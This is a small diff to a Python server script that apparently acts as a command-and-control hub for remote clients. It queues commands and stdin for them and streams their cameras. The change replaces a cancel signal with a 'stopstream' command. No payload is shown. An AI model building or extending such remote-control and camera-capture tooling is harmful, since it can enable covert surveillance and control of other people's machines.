@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.4"
+VERSION = "3.0.5"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -572,9 +572,10 @@ def input_loop():
                     continue
                 streaming_clients.discard(active_client)
                 camera_clients.pop(active_client, None)
-                # Send cancel signal only if client is currently streaming
-                client["pending_signal"] = "cancel"
-                client["pending_command"] = None
+                # Send as a command (not a signal) — signals are only polled inside
+                # Invoke-CommandStreaming; the streaming main loop polls /cmd
+                client["pending_command"] = "stopstream"
+                client["pending_signal"] = None
                 client["pending_stdin"] = []
             print(f"[*] Camera stream stopped on {active_client}")
             continue
